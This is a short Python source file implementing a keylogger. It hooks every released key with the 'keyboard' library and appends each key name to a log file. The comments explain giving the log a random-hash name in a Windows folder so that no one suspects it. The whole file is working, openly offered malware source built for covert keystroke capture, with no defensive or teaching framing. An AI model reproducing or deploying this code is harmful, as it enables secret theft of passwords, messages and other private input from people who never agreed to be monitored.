import keyboard

class keyloger():
    def __init__(self,file_path: str = r"C:\Users\eladg\Downloads\c647eb9735907a099bcd13ab8816a64b6dd83d365d180f63c62c9555a130d8c3" ): # I chose to use path instead of a name in order to make it more organized, and a bit more realistic... you would want to hide your file. the default is a random hash because if you put a random hash in the Windows folder on one would suspect
        self.file_path = file_path

    def start_log(self)-> None: # the name is a bit misleading because there is now function to stop the logger. but sure
        self.logkeys()

    def logkeys(self)->None:
        keyboard.on_release(callback=self.wrtiekeyboardinputtofile)
        keyboard.wait()


    def wrtiekeyboardinputtofile(self, keyboard_event)->None:
        inserttofile(keyboard_event.name, self.file_path)


def inserttofile( txt: str,file_path: str)->None: #external func because tjis is a general fucntion not related to the keylogger class
        with open(file_path,'a') as file: # used insertion instead of writing
            file.write(txt)

if __name__ == "__main__":
    keyloger().start_log()